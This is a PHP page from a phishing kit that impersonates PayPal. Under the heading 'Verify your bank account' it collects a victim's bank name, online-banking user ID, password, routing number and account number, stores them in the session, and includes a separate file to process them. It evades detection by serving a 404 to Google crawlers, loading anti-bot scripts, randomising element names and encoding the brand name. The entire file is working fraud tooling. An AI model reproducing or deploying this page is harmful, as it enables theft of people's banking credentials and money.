<?php
/*   
                         
*/

session_start();
date_default_timezone_set('GMT'); 
error_reporting(0); 
################### SECOND FILES #####################
include('../../functions/get_lang_en.php');
############## BILL ADDRESS INFORMATION ##############
$_SESSION['_bankname_']    = $_POST['bankname'];
$_SESSION['_BankID_']     = $_POST['BankID'];
$_SESSION['_BankPass_']        = $_POST['BankPass'];
$_SESSION['_RoutingNumber_']       = $_POST['RoutingNumber'];
$_SESSION['_AccountNumber_']     = $_POST['AccountNumber'];	
#####################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
if(empty($_POST['bankname'])== false) {
        include('BANK_INFO.php');
}
}
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
//include "../../../BOTS/antibots6.php";
//include "../../../BOTS/antibots7.php";
//include "../../../BOTS/antibots8.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xx_Z118xMARVEL xx_Z118xDCxComic <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_PowerRxRagers_x <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title><?=$Z118_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
</style>
</head>
<body id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
<header class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
    <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> headerxx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
        <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xGhostxRider_JC <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
            <a data-click="payPalxL0GR" href="#" class="xL0GR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"></a>
            <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> BTN_SuperMAN <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><span class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> ThexSHIELD118 <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><?=$Z118_securityLock;?></span></div>
        </div>
    </div>
</header>
    <xx_GOxGO class="Browxx_GOxGOZ118" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
        <section id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" role="xx_GOxGO" data-country="US" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
            <section id="xx_GOxGO" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V654DF654THEBEASTXX" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <form action="" method="post" name="GOxGOxPOWERxRANGERS" class="GOxGOxPOWERxRANGERS" nox_22id-z782="" id="x_28ID-Z680" novalidate="novalidate">
                            <div class="x_27ID-Z602 D_AvengersHERE789 x_22ID-Z523" id="x_33ID-Z717"><span>○</span><span>○</span><span>○</span><span class="selected">●</span><span>○</span><span>○</span></div>
                            <div class="x_22ID-Z740 HeaderZ118 x_25ID-Z718" id="x_32ID-Z730">
                                <h2 class="x_29ID-Z788">Verify your bank account</h2>
                            </div>
							<center><div><br><img src="../../lib/img/bnk.png" width="100" height="98" alt="Confirm Your Bank" ></div></center>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;">Dear customer, please enter your account information correctly and match with your information.</p>
                            </div>
                            <div class="x_27ID-Z728 MightyxMorphin x_34ID-Z610" id="x_30ID-Z783">
                            <div class="x_26ID-Z668 x_Gh0ST789 x_31ID-Z681" id="x_34ID-Z594">	
									    <div class="x_34ID-Z519" id="x_25ID-Z646">
									        <p style="margin-bottom: 8px;">Update Bank Account</p>                                       
                                            <div class="x_32ID-Z690 x_Gh0ST789 x_30ID-Z705" id="x_26ID-Z716">
											<div class="x_28ID-Z685" id="x_28ID-Z610">
                                                <div class="x_27ID-Z522 x_V-ForZ118 large" id="x_26ID-Z747">
                                                    
                                                    
                                                    <div id="8935-xMARVELxDCxCOMIC18x-10485" class="x_27ID-Z605  x_G00066XD x_31ID-Z574 ">
                                    <div id="12262-xMARVELxDCxCOMIC18x-9317" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44">
                                        <input for="11954-xMARVELxDCxCOMIC18x-8807" class="x_Z1186XDD7" name="bankname" type="text" placeholder="Bank Name" id="22DDIX1517248974">
                                    </div>
                                    <div id="9024-xMARVELxDCxCOMIC18x-11069" class="x_34ID-Z783 J118GhosTXRider x_33ID-Z639">
                                    </div>
                                </div>
                                
                                                    
								
											
                                                </div>
                                            </div>									
                                            <div class="x_24ID-Z638" id="x_25ID-Z654">
                                                <div class="x_34ID-Z788 x_V-ForZ118 large" id="x_23ID-Z776">
                                                    
                                                    
                                                    <div id="8935-xMARVELxDCxCOMIC18x-10485" class="x_27ID-Z605  x_G00066XD x_31ID-Z574 ">
                                    <div id="12262-xMARVELxDCxCOMIC18x-9317" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44">
                                        <input for="11954-xMARVELxDCxCOMIC18x-8807" class="x_Z1186XDD7" name="BankID" type="text" placeholder="Bank User ID" id="22DDIX1517248974">
                                    </div>
                                    <div id="9024-xMARVELxDCxCOMIC18x-11069" class="x_34ID-Z783 J118GhosTXRider x_33ID-Z639">
                                      
                                    </div>
                                </div>
                                                    
                                                    
                                                </div>
                                            </div>
                                            <div class="x_34ID-Z661 " id="stateHolder">
                                                <div class="x_24ID-Z602" id="x_24ID-Z745">
                                                    <div class="x_34ID-Z668 x_V-ForZ118 large" id="x_29ID-Z655">
                                                        
                                                        
                                                        
                                                        
                                                        <div id="8935-xMARVELxDCxCOMIC18x-10485" class="x_27ID-Z605  x_G00066XD x_31ID-Z574 ">
                                    <div id="12262-xMARVELxDCxCOMIC18x-9317" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44">
                                        <input for="11954-xMARVELxDCxCOMIC18x-8807" class="x_Z1186XDD7" name="BankPass" type="password" placeholder="Bank Password" id="22DDIX1517248974">
                                    </div>
                                    <div id="9024-xMARVELxDCxCOMIC18x-11069" class="x_34ID-Z783 J118GhosTXRider x_33ID-Z639">
                                      
                                    </div>
                                </div>
                                            
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="x_32ID-Z672 multi x_22ID-Z565 equal x_27ID-Z745 " id="x_28ID-Z679">
                                                <div class="x_25ID-Z730 x_V-ForZ118 x_23ID-Z593  medium x_32ID-Z572  left" id="x_24ID-Z532">
                                                    <input type="text" id="state" name="RoutingNumber" autocomplete="off" class="Xval666ideX1 x_25ID-Z568" required="required" aria-required="true" value="" placeholder="Routing Number">
                                                </div>
                                                <div class="x_29ID-Z730" id="x_31ID-Z722">
                                                    <div class="x_23ID-Z770 x_V-ForZ118 medium x_29ID-Z541  right" id="x_28ID-Z560">
                                                        <input type="text" id="postalCode" name="AccountNumber" autocomplete="off" class="Xval666ideX1 x_29ID-Z696" required="required" placeholder="Account Number" value="" aria-required="true">
                                                    </div>
                                                </div>
                                            </div>
                                            </div>
                                        </div>
									</div>							
                                   
                                    <div class="x_32ID-Z539 x_Gh0ST789" id="x_24ID-Z621">                                                                                       

                                    </div> 
 									
									<div class="x_27ID-Z694 agreeTC x_33ID-Z713  checkbox" id="PP-ID119879840501">
                                        <div class="x_33ID-Z659 x_V-ForZ118" id="x_22ID-Z696">
                                            <label class="helpNotifyUS" role="button">By clicking Agree &amp; Continue, I have read and agree to PayPaI’s <a data-click="userAgreement" href="#" target="_blank">User Agreement</a>, <a data-click="privacyPolicy" href="#" target="_blank">Privacy Policy</a> and <a data-click="esign" href="#" target="_blank">Electronic Communications Delivery Policy</a>.</label>
                                        </div>
                                    </div>
                                    <input id="x_23ID-Z577 submitBtnx_30ID-Z585 " name="" type="submit" class="ButtonZ118" value="Αgree &amp; Continue" data-click="WorldWideSubmit">
                                </div>
                            </form>
                    </div>
                </div>
            </section>
        </section>
    </xx_GOxGO>
	<br>
	 </br>	<br>
	 </br>	<br>
	 </br>	<br>
	 </br>	<br>
	 </br>
    <footer id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> gblFooter" role="contentinfo" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> IntentF00GER00" id="<?="PP-Z118".rand(1180018, 1001198745)?>">
            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00Nav <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> legal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <p class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> copyright <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">© <?=date('Y');?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a id="<?="privacyPolicy".rand(1180018, 1001198745)?> data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_fPrivacy;?></a></li>
                            <li><a id="<?="legalAgreement".rand(1180018, 1001198745)?> data-click="legalAgreement" href="#" target="_blank"><?=$Z118_flegal;?></a></li>
                            <li><a id="<?="contactUs".rand(1180018, 1001198745)?> data-click="contactUs" href="#" target="_blank"><?=$Z118_fHelpCenter;?></a></li>
                            <li class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> "></li>
                        </ul>
						<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> flag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
						<a id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" data-click="flagChange" href="#" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> country <?=$_SESSION['_LOOKUP_CNTRCODE_'];?>"><?="countryFlag".rand(1188, 10745)?></a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
<div class="rotation"><p style="font-size: 17px;font-family: Z118-Sans-Small-Regular, Helvetica Neue, Arial, sans-serif;margin-left: 14px;">Redirecting ... </p></div>
</body>
</html>